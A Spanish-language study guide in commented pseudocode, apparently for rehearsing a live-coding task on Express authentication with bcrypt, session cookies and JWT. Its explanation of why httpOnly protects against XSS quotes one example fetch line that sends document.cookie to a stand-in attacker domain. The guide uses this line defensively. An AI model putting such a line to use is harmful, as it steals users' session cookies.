// ═══════════════════════════════════════════════════════════════
// PRACTICA DE LIVE CODING - AUTENTICACION CON COOKIES Y JWT
// Pseudocodigo / guion. No se ejecuta, se usa para memorizar.
// ═══════════════════════════════════════════════════════════════


// ───────────────────────────────────────────────
// PASO 1: DEPENDENCIAS
// ───────────────────────────────────────────────
// npm install express better-sqlite3 bcrypt jsonwebtoken
// npm install express-session cookie-parser


// ───────────────────────────────────────────────
// PASO 2: IMPORTS EN app.js
// ───────────────────────────────────────────────
// const express = require('express')
// const session = require('express-session')
// const cookieParser = require('cookie-parser')
// const app = express()


// ───────────────────────────────────────────────
// PASO 3: MIDDLEWARES EN ESTE ORDEN
// ───────────────────────────────────────────────
// app.use(express.urlencoded({ extended: true }))   → parsear forms
// app.use(cookieParser())                           → leer req.cookies.*
// app.use(session({
//   secret: 'clave-secreta',
//   resave: false,
//   saveUninitialized: false,
//   cookie: {
//     httpOnly: true,       ← JS no puede leerla  → protege XSS
//     secure: false,        ← true en HTTPS (prod)
//     sameSite: 'strict',   ← protege CSRF
//     maxAge: 24*60*60*1000 ← 1 dia
//   }
// }))
// app.use(attachUser)   ← middleware custom (ver paso 7)


// ───────────────────────────────────────────────
// PASO 4: TABLA USERS (SQLite)
// ───────────────────────────────────────────────
// CREATE TABLE users (
//   id INTEGER PRIMARY KEY AUTOINCREMENT,
//   email TEXT UNIQUE NOT NULL,
//   password_hash TEXT NOT NULL
// )


// ───────────────────────────────────────────────
// PASO 5: SIGNUP (registro)
// ───────────────────────────────────────────────
// POST /signup
// async (req, res) => {
//   const { email, password } = req.body
//   try {
//     const hash = await bcrypt.hash(password, 10)      ← 10 = rounds
//     db.prepare('INSERT INTO users (email, password_hash) VALUES (?, ?)')
//       .run(email, hash)
//     res.redirect('/login')
//   } catch {
//     res.render('signup', { error: 'email duplicado' })
//   }
// }


// ───────────────────────────────────────────────
// PASO 6: LOGIN (dos opciones segun 'mode')
// ───────────────────────────────────────────────
// POST /login
// async (req, res) => {
//   const { email, password, mode } = req.body
//
//   // 1. buscar user y verificar hash
//   const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email)
//   const ok = user && await bcrypt.compare(password, user.password_hash)
//   if (!ok) return res.render('login', { error: 'credenciales invalidas' })
//
//   const payload = { id: user.id, email: user.email }
//
//   // 2a. OPCION A - SESION CON COOKIE
//   if (mode === 'session') {
//     req.session.user = payload
//     // express-session:
//     //   - guarda { user: payload } en memoria (o store)
//     //   - manda cookie 'connect.sid' con ID firmado al cliente
//   }
//
//   // 2b. OPCION B - JWT (stateless)
//   if (mode === 'jwt') {
//     const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '1h' })
//     // token = header.payload.signature (base64)
//     res.cookie('jwt', token, {
//       httpOnly: true,
//       secure: false,
//       sameSite: 'strict',
//       maxAge: 3600000
//     })
//     // el server NO guarda nada, toda la info va en el token firmado
//   }
//
//   res.redirect('/')
// }


// ───────────────────────────────────────────────
// PASO 7: MIDDLEWARE attachUser (lee sesion O JWT)
// ───────────────────────────────────────────────
// function attachUser(req, res, next) {
//   // 1. intentar leer de sesion
//   if (req.session && req.session.user) {
//     req.user = req.session.user
//     return next()
//   }
//
//   // 2. intentar leer de cookie JWT
//   const token = req.cookies && req.cookies.jwt
//   if (token) {
//     try {
//       req.user = jwt.verify(token, JWT_SECRET)   ← valida firma + expiracion
//     } catch {
//       req.user = null                            ← token invalido o expirado
//     }
//   }
//
//   next()
// }


// ───────────────────────────────────────────────
// PASO 8: MIDDLEWARE requireLogin (proteger rutas)
// ───────────────────────────────────────────────
// function requireLogin(req, res, next) {
//   if (!req.user) return res.redirect('/login')
//   next()
// }
//
// // uso:
// app.get('/dashboard', requireLogin, (req, res) => {
//   res.send('Hola ' + req.user.email)
// })


// ───────────────────────────────────────────────
// PASO 9: LOGOUT
// ───────────────────────────────────────────────
// POST /logout
// (req, res) => {
//   req.session?.destroy?.(() => {})   ← borra del store
//   res.clearCookie('connect.sid')     ← borra cookie de sesion
//   res.clearCookie('jwt')             ← borra cookie JWT
//   res.redirect('/login')
// }


// ═══════════════════════════════════════════════════════════════
// CONCEPTOS QUE TE PUEDEN PREGUNTAR
// ═══════════════════════════════════════════════════════════════

// 1) COOKIE DE SESION vs JWT
//
//    SESION (stateful):
//    ├─ server guarda los datos (req.session.user)
//    ├─ cliente recibe solo un ID en cookie 'connect.sid'
//    ├─ cada request: server busca el ID en su store y recupera los datos
//    ├─ logout real: destruir la sesion en el store
//    └─ contra: no escala bien sin store compartido (Redis, DB)
//
//    JWT (stateless):
//    ├─ toda la info del user va DENTRO del token, firmada con HS256
//    ├─ server NO guarda nada, solo verifica la firma
//    ├─ escalable: varios servers pueden validar sin compartir state
//    ├─ token = base64(header).base64(payload).signature
//    └─ contra: logout dificil (el token vive hasta expirar)


// 2) FLAGS DE COOKIE
//
//    httpOnly: true     → document.cookie no puede verla  → bloquea XSS
//    secure: true       → solo se manda por HTTPS         → evita sniff
//    sameSite: 'strict' → solo requests del mismo origen  → bloquea CSRF
//    maxAge: N          → duracion en milisegundos


// 3) BCRYPT
//
//    bcrypt.hash(password, 10)        → genera hash con salt aleatorio
//    bcrypt.compare(password, hash)   → devuelve true/false
//    NUNCA guardes la contraseña en texto plano
//    El "10" = cost factor (2^10 = 1024 rounds, cada +1 duplica el tiempo)


// 4) JWT: estructura del token
//
//    header.payload.signature
//
//    header    = { alg: 'HS256', typ: 'JWT' }             (base64)
//    payload   = { id: 1, email: 'x@y.com', exp: ..., iat: ... }  (base64)
//    signature = HMAC_SHA256(header + '.' + payload, JWT_SECRET)
//
//    Si alguien cambia el payload, la firma no coincide → invalido


// 5) POR QUE HTTPOnly PROTEGE DE XSS
//
//    Sin httpOnly: un script inyectado puede hacer
//      fetch('http://atacante.com?cookie=' + document.cookie)
//    Con httpOnly: document.cookie NO incluye esa cookie → no se roba


// 6) POR QUE SAMESITE PROTEGE DE CSRF
//
//    Ataque CSRF: el atacante crea un form que hace POST a tu sitio
//    desde otro dominio mientras vos estas logueado.
//    Con SameSite=strict, el browser NO manda tus cookies en esa request
//    cross-origin → el server no te identifica → ataque fallido.


// ═══════════════════════════════════════════════════════════════
// EJERCICIO: IMPLEMENTALO SIN MIRAR
// ═══════════════════════════════════════════════════════════════
// 1. Cerra este archivo
// 2. Abri un app.js en blanco
// 3. En 15 minutos tenes que tener:
//    - POST /signup con bcrypt
//    - POST /login con switch session/jwt
//    - GET /dashboard protegido
//    - POST /logout
// 4. Si te trabas, volve acá y busca el paso especifico
